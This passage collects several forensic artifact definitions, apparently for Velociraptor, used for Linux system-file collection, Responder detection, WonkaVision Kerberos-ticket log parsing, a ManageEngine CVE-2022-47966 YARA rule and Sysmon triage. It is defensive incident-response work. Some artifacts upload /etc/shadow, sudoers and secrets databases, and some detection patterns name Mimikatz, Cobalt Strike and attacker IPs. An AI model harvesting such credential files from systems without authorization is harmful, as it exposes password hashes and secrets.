    ["/etc/enterprise-release", "/etc/system-release", "/etc/oracle-release", "/etc/lsb-release", "/etc/redhat-release"]

- name: LinuxRestrictedDmesgReadPrivileges
  default: /proc/sys/kernel/dmesg_restrict

- name: LinuxRestrictedKernelPointerReadPrivileges
  default: /proc/sys/kernel/kptr_restrict

- name: LinuxRsyslogConfigs
  default: |
    ["/etc/rsyslog.d", "/etc/rsyslog.d/*", "/etc/rsyslog.conf"]

- name: LinuxSecureFsLinks
  default: |
    ["/proc/sys/fs/protected_symlinks", "/proc/sys/fs/protected_hardlinks"]

- name: LinuxSecureSuidCoreDumps
  default: /proc/sys/fs/suid_dumpable

- name: LinuxSSDTTables
  default: /sys/firmware/acpi/tables/SSDT*

- name: LinuxSysctlConfigurationFiles
  default: |
    ["/etc/sysctl.d/*.conf", "/etc/sysctl.con", "/usr/lib/sysctl.d/*.conf", 
     "/run/sysctl.d/*.conf", "/lib/sysctl.d/*.conf", "/usr/local/lib/sysctl.d/*.conf"]

- name: LinuxSyslogNgConfigs
  default: |
    ["/etc/syslog-ng/conf-d/*.conf", "/etc/syslog-ng/syslog-ng.conf"]

- name: LinuxSystemdJournalConfig
  default: /etc/systemd/journald.conf

- name: LinuxSystemdOSRelease
  default: |
    ["/usr/lib/os-release", "/etc/os-release"]

- name: LinuxTimezoneFile
  default: /etc/timezone

- name: LinuxXinetd
  default: |
    ["/etc/xinetd.d/**", "/etc/xinetd.conf"]

- name: LocateDatabase
  default: |
    ["/etc/updatedb.conf", "/var/lib/mlocate/mlocate.db"]

- name: LoginPolicyConfiguration
  default: |
    ["/etc/passwd", "/etc/shadow", "/root/.k5login", "/etc/netgroup", "/etc/nsswitch.conf", "/etc/security/access.conf"]

- name: NetgroupConfiguration
  default: /etc/netgroup

- name: NfsExportsFile
  default: |
    ["/private/etc/exports", "/etc/exports"]

- name: NtpConfFile
  default: /etc/ntp.conf

- name: PCIDevicesInfoFiles
  default: |
    ["/sys/bus/pci/devices/*/config", "/sys/bus/pci/devices/*/vendor", 
     "/sys/bus/pci/devices/*/device", "/sys/bus/pci/devices/*/class"]

- name: SambaConfigFile
  default: /etc/samba/smb.conf

- name: SecretsServiceDatabaseFile
  default: |
    ["/var/lib/sss/secrets/.secrets.mkey", "/var/lib/sss/secrets/secrets.ldb"]

- name: SshdConfigFile
  default: |
    ["/etc/ssh/sshd_config", "/private/etc/ssh/sshd_config"]

- name: SSHHostPubKeys
  default: /etc/ssh/ssh_host_*_key.pub

- name: UnixGroupsFile
  default: |
    ["/etc/group", "/private/etc/group"]

- name: UnixLocalTimeConfigurationFile
  default: |
    ["/private/etc/localtime", "/etc/localtime"]

- name: UnixPasswdFile
  default: |
    ["/private/etc/passwd", "/etc/passwd"]

- name: UnixShadowFile
  default: |
    ["/private/etc/shadow", "/etc/shadow"]

- name: UnixSudoersConfigurationFile
  default: |
    ["/etc/sudoers", "/private/etc/sudoers"]

- name: YumSources
  default: |
    ["/etc/yum.conf", "/etc/yum.repos.d/*.repo"]

sources:
- name: uploadAPTSources
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=APTSources))

- name: uploadAPTTrustKeys
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=APTTrustKeys))

- name: uploadCronAtAllowDenyFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=CronAtAllowDenyFiles))

- name: uploadDebianPackagesStatus
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=DebianPackagesStatus)

- name: uploadDebianVersion
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=DebianVersion)

- name: uploadKernelModules
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=KernelModules))

- name: uploadLinuxASLREnabled
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxASLREnabled)

- name: uploadLinuxCACertificates
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxCACertificates))

- name: uploadLinuxDHCPConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxDHCPConfigurationFile)

- name: uploadLinuxDSDTTable
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxDSDTTable)

- name: uploadLinuxFstab
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxFstab)

- name: uploadLinuxGrubConfiguration
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxGrubConfiguration))

- name: uploadLinuxInitrdFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxInitrdFiles))

- name: uploadLinuxIssueFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxIssueFile))

- name: uploadLinuxKernelBootloader
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxKernelBootloader))

- name: uploadLinuxKernelModuleRestrictions
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxKernelModuleRestrictions))

- name: uploadLinuxKernelModuleTaintStatus
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxKernelModuleTaintStatus)

- name: uploadLinuxLoaderSystemPreloadFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxLoaderSystemPreloadFile)

- name: uploadLinuxLocalTime
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxLocalTime)

- name: uploadLinuxLSBInit
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxLSBInit))

- name: uploadLinuxLSBRelease
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxLSBRelease)

- name: uploadLinuxNetworkManager
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxNetworkManager))

- name: uploadLinuxPamConfigs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxPamConfigs))

- name: uploadLinuxPasswdFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxPasswdFile)

- name: uploadLinuxProcMounts
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxProcMounts)

- name: uploadLinuxRelease
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxRelease))

- name: uploadLinuxRestrictedDmesgReadPrivileges
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxRestrictedDmesgReadPrivileges)

- name: uploadLinuxRestrictedKernelPointerReadPrivileges
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxRestrictedKernelPointerReadPrivileges)

- name: uploadLinuxRsyslogConfigs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxRsyslogConfigs))

- name: uploadLinuxSecureFsLinks
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSecureFsLinks))

- name: uploadLinuxSecureSuidCoreDumps
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxSecureSuidCoreDumps)

- name: uploadLinuxSSDTTables
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxSSDTTables)

- name: uploadLinuxSysctlConfigurationFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSysctlConfigurationFiles))

- name: uploadLinuxSyslogNgConfigs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSyslogNgConfigs))

- name: uploadLinuxSystemdJournalConfig
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxSystemdJournalConfig)

- name: uploadLinuxSystemdOSRelease
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSystemdOSRelease))

- name: uploadLinuxTimezoneFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxTimezoneFile)

- name: uploadLinuxXinetd
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxXinetd))

- name: uploadLocateDatabase
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LocateDatabase))

- name: uploadLoginPolicyConfiguration
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LoginPolicyConfiguration))

- name: uploadNetgroupConfiguration
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=NetgroupConfiguration)

- name: uploadNfsExportsFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=NfsExportsFile))

- name: uploadNtpConfFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=NtpConfFile)

- name: uploadPCIDevicesInfoFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=PCIDevicesInfoFiles))

- name: uploadSambaConfigFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=SambaConfigFile)

- name: uploadSecretsServiceDatabaseFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=SecretsServiceDatabaseFile))

- name: uploadSshdConfigFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=SshdConfigFile))

- name: uploadSSHHostPubKeys
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=SSHHostPubKeys)

- name: uploadUnixGroupsFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixGroupsFile))

- name: uploadUnixLocalTimeConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixLocalTimeConfigurationFile))

- name: uploadUnixPasswdFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixPasswdFile))

- name: uploadUnixShadowFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixShadowFile))

- name: uploadUnixSudoersConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixSudoersConfigurationFile))

- name: uploadYumSources
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=YumSources))

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Sys.Automator.yaml
======
name: MacOS.Sys.Automator
description: |
  This artifact collects information about Automator actions and workflows. 
  
  It can be used to identify malicious actions inserted into common/default workflows, or non-standard workflows.
  
reference:
  - https://support.apple.com/en-ae/guide/automator/welcome/mac
  
type: CLIENT

author: Wes Lambert - @therealwlambert

precondition: SELECT OS FROM info() WHERE OS =~ 'darwin'

parameters:
  - name: ActionGlob
    default: /System/Library/Automator/*/Contents/Info.plist 
  - name: WorkflowGlob
    default: /Library/Application Support/Apple/Automator/Workflows/*/Contents/*.wflow
  - name: UploadActions
    default: N
    type: bool
  - name: UploadWorkflows
    default: N
    type: bool
    
sources:
  - name: Actions
    query: 
      LET ActionLocation = SELECT * from glob(globs=ActionGlob)
      LET Actions = SELECT OSPath, Mtime, Atime, Ctime, Btime, plist(file=OSPath) AS AMAction FROM ActionLocation
      SELECT * from foreach(
            row=Actions,
            query={
               SELECT Mtime AS Timestamp,
                      get(field="AMName") AS Name,
                      get(field="AMApplication") AS Application,
                      get(field="AMIconName") AS IconName,
                      get(field="CFBundleExecutable") AS ExecutableName,
                      get(field="NSPrincipalClass") AS PrincipalClass,
                      get(field="CFBundleIdentifier") AS BundleIdentifier,
                      get(field="AMDefaultParameters") AS DefaultParameters,
                      get(field="NSHumanReadableCopyright") AS Copyright,
                      get(field="AMDescription") AS Description,
                      if(condition=UploadActions,
                          then=upload(file=OSPath,
                          mtime=Mtime,
                          atime=Atime,
                          ctime=Ctime,
                          btime=Btime)) AS Upload,
                      AMAction AS _Content
               FROM AMAction
          }
      )
     
  - name: Workflows
    query: |
      LET WorkflowLocation = SELECT * from glob(globs=WorkflowGlob)
      LET Workflows = SELECT OSPath, Mtime, Atime, Ctime, Btime, plist(file=OSPath) AS AMWorkflow FROM WorkflowLocation
      SELECT * from foreach(
            row=Workflows,
            query={
               SELECT
                    Mtime AS Timestamp, 
                    OSPath AS Name,
                    get(member="actions.action.ActionName") AS Actions, 
                    get(field="state") AS State,
                    get(field="WorkflowIsShared") AS Shared,
                    get(field="workflowMetaData") AS WorkflowMetadata,
                    get(field="connectors") AS Connectors,
                    if(condition=UploadWorkflows,
                          then=upload(file=OSPath,
                          mtime=Mtime,
                          atime=Atime,
                          ctime=Ctime,
                          btime=Btime)) AS Upload,
                    AMWorkflow AS _Content
               FROM AMWorkflow
          }
      )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Exchange.Windows.System.PowerShell.DetectResponder.yaml
======
name: Exchange.Windows.System.PowerShell.DetectResponder
author: "Dhruv Majumdar, Jamie Bhoohe"
description: |
  This artifact allows to detect responder in the environment
  https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/
type: CLIENT_EVENT
required_permissions:
  - EXECVE

precondition:
  SELECT OS From info() where OS = 'windows'

parameters:
  - name: PowerShellExe
    default: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  - name: ReloadPeriod
    description: Checks for responder activity
    default: "600"
    type: int

sources:
  - query: |
     SELECT * FROM foreach(
        row={
            SELECT * FROM clock(period=ReloadPeriod)
        },
        query={
            SELECT * FROM execve(argv=[PowerShellExe,
            "-ExecutionPolicy", "Unrestricted", '''$llmnr = (Resolve-DnsName -LlmnrOnly evilname) 2> $NULL 
            if ($llmnr) { 
            $evil_IP = $llmnr.IPAddress -Join ", " 
            $msg = "Subject: HIGH SEV - Responder Detcted `nDomain: $env:USERDNSDOMAIN `nHostname: ${env:computername} `nRouge LLMNR Server: $evil_IP" 
            echo $msg 
            }'''])
            WHERE log(message="Responder Detection Running")
        })


---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.WonkaVision.yaml
======
name: Windows.EventLogs.WonkaVision
description: |
   Collect WonkaVision logs from Windows hosts.
   
   WonkaVision is a utility developed by @4ndr3w6S and @exploitph that is used to detect forged Kerberos tickets.
   
   This artifact allows users to run the utility (if desired) and collect the relevant logs from the Windows Application log.
   
reference:
  - https://github.com/0xe7/WonkaVision
  
author: Wes Lambert - @therealwlambert
parameters:
   - name: TargetGlob
     default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
   - name: VSSAnalysisAge
     type: int
     default: 0
     description: |
      If larger than zero we analyze VSS within this many days
      ago. (e.g 7 will analyze all VSS within the last week).  Note
      that when using VSS analysis we have to use the ntfs accessor
      for everything which will be much slower.
   - name: IdRegex
     default: .
     type: regex
   - name: RunWonkaVision
     type: bool
     default: F
     description: Run WonkaVision.exe

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET RunWV <= if(condition=RunWonkaVision, then={SELECT * FROM chain(a={SELECT * FROM Artifact.Exchange.Windows.Detection.WonkaVision()}, b=sleep(time=10))})
        LET EventDescriptionTable <= SELECT * FROM parse_csv(accessor="data", filename='''
          ID,Description
          9988,Possible compromised session
          9989,Possible forged ticket
          ''')
        SELECT EventTime,
            Computer,
            Channel,
            Provider,
            EventID,
            EventRecordID,
            { SELECT Description FROM EventDescriptionTable WHERE ID = EventID} AS Description,
            if(condition = EventID =~ "9988", 
                then=grok(data=EventData, grok='''Possible compromised session\\nTotal Score: %{DATA:total_score}\\nSession: %{DATA:session}\\nMachine Name: %{DATA:machine_name}\\nUsername: %{DATA:user}\\n\\nIOAs:\\n\\n\\tUsernameMismatch: %{DATA:username_mismatch}\\n\\n\\nIOA Reasons: %{DATA:ioa_reasons}.  '''), 
                else=grok(data=EventData, grok='''Possible forged ticket\\nTotal Score: %{DATA:total_score}\\nSession: %{DATA:session}\\nMachine Name: %{DATA:machine_name}\\nUser: %{DATA:user}\\nService Principal Name: %{DATA:service_principal_name}\\n\\nIOAs:%{DATA:ioa}\\n\\n\\tPasswordMustChange: %{DATA:password_must_change}\\n\\n\\nTool Scores:\\n\\tMimikatz Score: %{NUMBER:mimikatz_score}\\n\\tImpacket Score: %{NUMBER:impacket_score}\\n\\tRubeus Score: %{NUMBER:rubeus_score}\\n\\tCobalt Strike Score: %{NUMBER:cobalt_strike_score}\\n\\n\\nIOA Reasons: %{DATA:ioa_reasons}.  ''',patterns=["Possible forged ticket\\nTotal Score: %{DATA:total_score}\\nSession: %{DATA:session}\\nMachine Name: %{DATA:machine_name}\\nUser: %{DATA:user}\\nService Principal Name: %{DATA:service_principal_name}\\n\\nIOAs:%{DATA:ioa}\\n\\n\\nTool Scores:\\n\\tMimikatz Score: %{NUMBER:mimikatz_score}\\n\\tImpacket Score: %{NUMBER:impacket_score}\\n\\tRubeus Score: %{NUMBER:rubeus_score}\\n\\tCobalt Strike Score: %{NUMBER:cobalt_strike_score}\\n\\n\\nIOA Reasons: %{GREEDYDATA:ioa_reasons}"])) AS EventDetails,
            EventData.Data[0] AS EventDataOriginal
        FROM Artifact.Windows.EventLogs.EvtxHunter(
            EvtxGlob=TargetGlob,
            VSSAnalysisAge=VSSAnalysisAge,
            IdRegex=IdRegex)
        WHERE Provider =~ "Wonka"

---END OF FILE---

======
FILE: /content/exchange/artifacts/ManageEngineLog.yaml
======
name: Generic.Detection.ManageEngineLog
author: Matt Green - @mgreen27, Jason Frost - @jaysonfrost2
description: |
   This artifact will enable discovery of logs associated with observed exploitation 
   of critical ManageEngine vulnerability: CVE-2022-47966.
   
   The artifact leverages Yara.Glob to scan ManageEngine logs and is cross 
   platform.


type: CLIENT

parameters:
   - name: TargetLogGlob
     default: "**/{ServiceDesk/logs,logs3PM}/serverout*.txt"
   - name: YaraRule
     default: |
        rule LOG_EXPL_ManageEngine_CVE_2022_47966_Jan23 {
           meta:
              description = "Detects Exploitation of Critical ManageEngine Vulnerability: CVE-2022-47966"
              author = "Matt Green - @mgreen27"
              reference = "https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/"
              date = "2023-01-20"
           strings:
             $s1 = "com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected" 

             $re1 = /invalid_response --> .{20,}/s  //Logging typically contains this string followed by Base64 <samlp:Response Version=
             
             $ip1 = "111.68.7.122"
             $ip2 = "149.28.193.216"
             $ip3 = "172.93.193.64"
             
            condition:
              any of them
        }
   - name: Context
     default: 200
     description: Amount of ContextBytes to include on each hit.
   - name: NumberOfHits
     default: 9999
     description: Maximum number of hits to return
   - name: UploadHits
     type: bool
     description: Upload each file with a hit.
        
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
      SELECT * FROM Artifact.Generic.Detection.Yara.Glob(
                                        PathGlob=TargetLogGlob,
                                        YaraRule=YaraRule,
                                        ContextBytes=Context,
                                        NumberOfHits=9999,
                                        UploadHits=UploadHits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Import.WatchLocalDirectory.yaml
======
name: Server.Import.WatchLocalDirectory
description: |
   This is an artifact that will monitor a local path for collections, 
   which it will then ingest. 

type: SERVER_EVENT

parameters:
   - name: WatchDir
     default: "/tmp/watch/*.zip"

sources:
  - query: |
        SELECT * FROM foreach(
            row={
                SELECT * FROM diff(
                    query={
                        SELECT OSPath FROM glob(globs=WatchDir)
                    }, period=3, key="OSPath"
                )
                WHERE Diff =~ "added"
            }, query={
                SELECT *, import_collection(filename=OSPath), OSPath 
                FROM scope()
            }
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/SysmonTriage.yaml
======
name: Windows.Triage.Sysmon
author: Matt Green - @mgreen27
description: |
   This artifact allows collecting Sysmon Events for Triage around a timestamp.
   
   By default collection will be 600 seconds from the current time and allows 
   fast triage of a machine with recent telemetry.
   
type: CLIENT

parameters:
   - name: TargetTime
     description: the timestamp we want to box time around. Default is current time.
     type: timestamp
   - name: TargetTimeBox
     description: the time box in seconds we want around TargetTime.
     default: 600
     type: int
   - name: IdRegex
     description: Regex of Sysmon EventIDs to include. Default is all.
     default: .
   - name: IocRegex
     description: Regex of strings to search for in Sysmon events. Default is any.
     default: .
   - name: FilterRegex
     description: Regex of strings to filter out of results. Default is none.
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- firstly set boxed timebounds
      LET DateAfterTime <= if(condition=TargetTime,
        then=timestamp(epoch=TargetTime.Unix - TargetTimeBox), else=timestamp(epoch=now() - TargetTimeBox))
      LET DateBeforeTime <= if(condition=TargetTime,
        then=timestamp(epoch=TargetTime.Unix + TargetTimeBox), else=timestamp(epoch=now() + TargetTimeBox))
        
      -- run query and output rows
      SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(
                EvtxGlob='''%SystemRoot%\System32\Winevt\Logs\*Sysmon*.evtx''',
                ChannelRegex='Sysmon',
                DateAfter= DateAfterTime,
                DateBefore= DateBeforeTime,
                IdRegex=IdRegex,
                IocRegex=IocRegex,
                WhitelistRegex=FilterRegex )

    notebook:
      - type: vql_suggestion
        name: 1. Process event timeline
        template: |
            /*
            ## 1: Process creation
            Comment in fields as needed.
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --EventData.RuleName as RuleName
                --EventData.UtcTime as UtcTime
                --EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.OriginalFileName as OriginalFileName
                --,dict(FileVersion = EventData.FileVersion, Description = EventData.Description, Product = EventData.Product,Company = EventData.Company,OriginalFileName = EventData.OriginalFileName) as VersionInformation
                ,EventData.CommandLine as CommandLine
                --,EventData.CurrentDirectory as CurrentDirectory
                ,EventData.User as User
                --,EventData.LogonGuid as LogonGuid
                --,EventData.LogonId as LogonId
                --,EventData.TerminalSessionId as TerminalSessionId
                --,EventData.IntegrityLevel as IntegrityLevel
                --,parse_string_with_regex(string=EventData.Hashes, regex=["MD5=(?P<MD5>[^,]+)","SHA1=(?P<SHA1>[^,]+)","SHA256=(?P<SHA256>[^,]+)","IMPHASH=(?P<IMPHASH>[^,]+)"] ) as Hash
                --,EventData.ParentProcessGuid as ParentProcessGuid
                ,EventData.ParentProcessId as ParentProcessId
                ,EventData.ParentImage as ParentImage
                ,EventData.ParentCommandLine as ParentCommandLine
                --,EventData.ParentUser as ParentUser
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 1
 
      - type: vql_suggestion
        name: 2 Change file time
        template: |
            /*
            ## 2: A process changed a file creation time
                The change file creation time event is registered when a file creation time is 
                explicitly modified by a process. This event helps tracking the real creation 
                time of a file. Attackers may change the file creation time of a backdoor to 
                make it look like it was installed with the operating system. Note that many 
                processes legitimately change the creation time of a file; it does not 
                necessarily indicate malicious activity.
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --EventData.RuleName as RuleName
                --EventData.UtcTime as UtcTime
                --EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.TargetFilename as TargetFilename
                ,EventData.CreationUtcTime as CreationUtcTime
                ,EventData.PreviousCreationUtcTime as PreviousCreationUtcTime
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 2

      - type: vql_suggestion
        name: 3. Network event timeline
        template: |             
            /*
            ## 3. Network connection
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.Protocol as Protocol
                ,EventData.Initiated as Initiated
                ,EventData.SourceIsIpv6 as SourceIsIpv6
                ,EventData.SourceIp as SourceIp
                ,EventData.SourceHostname as SourceHostname
                ,EventData.SourcePort as SourcePort
                ,EventData.SourcePortName as SourcePortName
                ,EventData.DestinationIsIpv6 as DestinationIsIpv6
                ,EventData.DestinationIp as DestinationIp
                ,EventData.DestinationHostname as DestinationHostname
                ,EventData.DestinationPort as DestinationPort
                ,EventData.DestinationPortName as DestinationPortName
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 3
       
       
      - type: vql_suggestion
        name: 8. CreateRemoteThread
        template: |           
            /*
            ## 8: CreateRemoteThread
            The CreateRemoteThread event detects when a process creates a thread in another 
            process. This technique is used by malware to inject code and hide in other 
            processes. The event indicates the source and target process. It gives 
            information on the code that will be run in the new thread: StartAddress, 
            StartModule and StartFunction. Note that StartModule and StartFunction fields 
            are inferred, they might be empty if the starting address is outside loaded 
            modules or known exported functions.
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.SourceProcessGuid as SourceProcessGuid
                ,EventData.SourceProcessId as SourceProcessId
                ,EventData.SourceImage as SourceImage
                ,EventData.SourceUser as SourceUser
                --,EventData.TargetProcessGuid as TargetProcessGuid
                ,EventData.TargetImage as TargetImage
                ,EventData.TargetUser as TargetUser
                ,EventData.NewThreadId as NewThreadId
                ,EventData.StartAddress as StartAddress
                ,EventData.StartModule as StartModule
                ,EventData.StartFunction as StartFunction
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 8
     
      - type: vql_suggestion
        name: 10. ProcessAccess
        template: |          
            /*
            ## 10: ProcessAccess
            The process accessed event reports when a process opens another process, 
            an operation that’s often followed by information queries or reading 
            and writing the address space of the target process. This enables 
            detection of hacking tools that read the memory contents of processes 
            like Local Security Authority (Lsass.exe) in order to steal credentials 
            for use in Pass-the-Hash attacks. Enabling it can generate significant 
            amounts of logging if there are diagnostic utilities active that 
            repeatedly open processes to query their state, so it generally 
            should only be done so with filters that remove expected accesses.
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.SourceProcessGuid as SourceProcessGuid
                ,EventData.SourceProcessId as SourceProcessId
                ,EventData.SourceThreadId as SourceThreadId
                ,EventData.SourceImage as SourceImage
                ,EventData.SourceUser as SourceUser
                --,EventData.TargetProcessGuid as TargetProcessGuid
                ,EventData.TargetProcessId as TargetProcessId
                ,EventData.TargetImage as TargetImage
                ,EventData.TargetUser as TargetUser
                ,EventData.GrantedAccess as GrantedAccess
                ,EventData.CallTrace as CallTrace
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 10

      - type: vql_suggestion
        name: 11. FileCreate
        template: |             
            /*
            ## 11: FileCreate
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.TargetFilename as TargetFilename
                ,EventData.CreationUtcTime as CreationUtcTime
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 11

      - type: vql_suggestion
        name: 12 13 14. Registry events
        template: |                 
            /*
            ## 12, 13, 14: Registry
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.EventType as EventType
                ,EventData.TargetObject as TargetObject
                ,EventData.Details as Details
                ,EventData.NewName as NewName
                --,EventData
                --,Message
